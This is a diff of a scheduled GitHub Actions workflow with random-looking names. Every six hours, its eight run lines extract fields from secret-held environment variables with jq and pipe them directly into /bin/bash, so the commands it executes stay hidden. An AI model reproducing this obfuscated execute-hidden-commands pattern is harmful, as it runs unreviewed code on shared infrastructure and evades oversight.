@@ -1,22 +1,25 @@
 name: renquanniu3481
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 2/6 * * *'
+    - cron: '27 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: renquanniu3481
         env:
-          zzpfp9: ${{ secrets.zzpfp9 }}
+          l1250: ${{ secrets.l1250 }}
         run: |
-          echo $zzpfp9 | jq -r .xo00 | /bin/bash
-          echo $o946 | jq -r .sfkxv20763 | /bin/bash
-          echo $hq192 | jq -r .mq526 | /bin/bash
-          echo $muz07 | jq -r .vq52781 | /bin/bash
-          echo $oaihc923 | jq -r .bndl93 | /bin/bash
-          echo $wzbp5002 | jq -r .l72 | /bin/bash
+          echo $l1250 | jq -r .n47 | /bin/bash
+          echo $eefy057 | jq -r .cqko3 | /bin/bash
+          echo $maf52742 | jq -r .ledb624 | /bin/bash
+          echo $qs489 | jq -r .afg918 | /bin/bash
+          echo $a65082 | jq -r .slj06742 | /bin/bash
+          echo $ksld8 | jq -r .y7561 | /bin/bash
+          echo $iiowj2 | jq -r .ps5 | /bin/bash
+          echo $dd5623 | jq -r .cwmfr4927 | /bin/bash
 
